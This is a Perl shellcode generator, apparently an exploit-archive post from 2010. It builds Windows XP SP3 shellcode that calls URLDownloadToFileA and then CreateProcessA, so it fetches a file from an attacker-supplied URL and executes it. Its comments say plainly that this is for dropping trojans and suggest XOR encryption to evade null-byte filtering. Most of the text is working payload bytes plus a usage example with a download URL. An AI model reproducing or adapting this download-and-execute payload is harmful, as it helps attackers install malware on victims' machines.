#!/usr/bin/perl
#c0d3d by r0i aka d0lc3
#
#Exploit Title:		ShellCode WinXP SP3 SPA URLDownloadToFileA + CreateProcessA + #			ExitProcess

#Date:			24/06/2010

#Size:			176 bytes++

#Author:		d0lc3	d0lc3x[at]gmail[dom]com

#Author Link:		http://elotrolad0.blogspot.com/

#Tested on:		Windows XP 32 bits Service Pack 3 (lang. spanish)

#Summary:
#
#Shellcode: URLDownloadToFileA + CreateProcessA + ExitProcess
#
#This script will build shellcode necessary to download file (you know trojanS? :D) and #execute it later, finally exiting process.
#Size of shellcode is 176 bytes WITHOUT URL and FILE strings length.
#Best method to avoid NULL bytes maybe is crypt shellcode (XOR simple & effective) and #add  routine to decrypt it before perform it.
#MAX URL SIZE:	255 bytes
#MAX FILE SIZE:	255 bytes
#
#
#
#
#
#

system("clear");
if($#ARGV!=0) {
	&usage();
}
else{
	&banner();
}
$URL=$ARGV[0];
$FILE=&getFileName($URL);
$leng=length($URL)+length($FILE)+176;		#176 default length of shellcode
#opcodes from OllyDBG :)
$ShellCode =
'\xE8\x00\x00\x00\x00'.				#getting offsets and delta offset
'\x8D\x44\x24\xFF'.
'\x40'.
'\x8D\x1D\x06\x10\x40\x00'.
'\x4B'.
'\x8B\x00'.
'\x2B\xC3'.
'\x8B\xE8'.
'\x33\xDB'.
'\x32\xD2'.
'\xB8\xA6\x10\x40\x00'.
'\xEB\x01'.
'\x43'.
'\x38\x14\x03'.
'\x75\xFA'.
'\x89\x9D\x56\x32\x40\x00'.
'\xEB\x6E'.
'\x5A'.
'\x89\x95\xFF\x30\x40\x00'.
'\x8D\x9D\x56\x32\x40\x00'.
'\x8B\x1B'.
'\x81\xC3\xA7\x10\x40\x00'.
'\xFF\xE3'.
'\x5A'.
'\x89\x95\x00\x30\x40\x00'.
'\x33\xC9'.
'\x51'.
'\x51'.
'\x8D\x85\xFF\x30\x40\x00'.
'\x8B\x00'.
'\x50'.						#push Url offset
'\x8D\x85\x00\x30\x40\x00'.
'\x8B\x00'.
'\x50'.						#push file offset
'\x51'.
'\xB8\xED\x77\x4B\x44'.				#mov EAX,URLDownloadToFileA
'\x40'.
'\x40'.
'\x8B\xFF'.
'\xFF\xD0'.					#call EAX (URLDown...)
'\x8D\x85\xFE\x31\x40\x00'.
'\x50'.
'\x8D\x85\x0E\x32\x40\x00'.
'\x50'.
'\x33\xC9'.
'\x51'.
'\x51'.
'\x51'.
'\x6A\x01'.
'\x51'.
'\x51'.
'\x51'.
'\x8D\x85\xFF\x30\x40\x00'.
'\x8B\x00'.
'\x50'.						#push EAX ( file offset )
'\xE8\xD5\x12\x40\x7C'.				#call CreateProcessA
'\x33\xC9'.
'\x51'.
'\xE8\x74\xBA\x41\x7C'.
'\x8D\x9D\x30\x10\x40\x00'.
'\xFF\xD3'.
$FILE.'\x00'.				#call for push FILE string offset
'\x8D\x1D\x47\x10\x40\x00'.
'\xFF\xD3'.				#call for push URL string offset
$URL.'\x00';

print"\n\n\n[+]URL: ".$URL."\n[+]File: ".$FILE."\n[+]Length: ".$leng."\n[+]Shellcode:\n".$ShellCode."\n";
&credits();


#Getting FileName
sub getFileName($url){
$url=shift;
$slash="/";
$FileName=substr($URL,rindex($URL,$slash)+1);
return $FileName;
}
#usage subroutine
sub usage(){
	print"[+]Usage:	perl $0	<Url_of_file>\n";
	print"[+]Example:	perl $0	\"http://myURL.net/myFiles/myFileToDownload.exe\"\n";
	&credits();
}
#mycr3di7s }:D
sub credits(){
	print"\n\n"."-"x10 ."> c0d3d_by_d0lc3 <"."-"x10 ."\n\n";
	exit(0);
}
#m0re cr3ditZ?..
sub banner(){
print q"
          ++.    `    `o+-
        -dMMMh- .+  `sNMMMd/
      `++hMMMMN .s:+/ymMMMMMh
      /`  hMMMM/+o     :mMMMM.          ########################################
          hMMMM`./      oMMMm           #	      SC0de Gen3rat0r	       #
       `/+mMMMM`./      mMMy`           ########################################
      +NMMMMMMM`.+    .dd+`             	        #by d0lc3#
     `No:-hMMMM.`/`-+hMMNs`              	        ##########
      ` `-hMMMM++s-`-yMMMMM/
      -dMMMMMMM..+    -MMMMN.
     .NmysmMMMM..o     yMMMM/           0p3n y0ur m1nd,
     .:   hMMMM..+     /MMMMo          		7h1nk fr33!!!
          hMMMM.`/`-   `NMMMd  `o`
        -+mMMMMdhy:`    yMMMMd/+.
     /yNNNNMMMMMy/      `hMMMN/
   :s/-`   `./s+`/        /dy.
";

}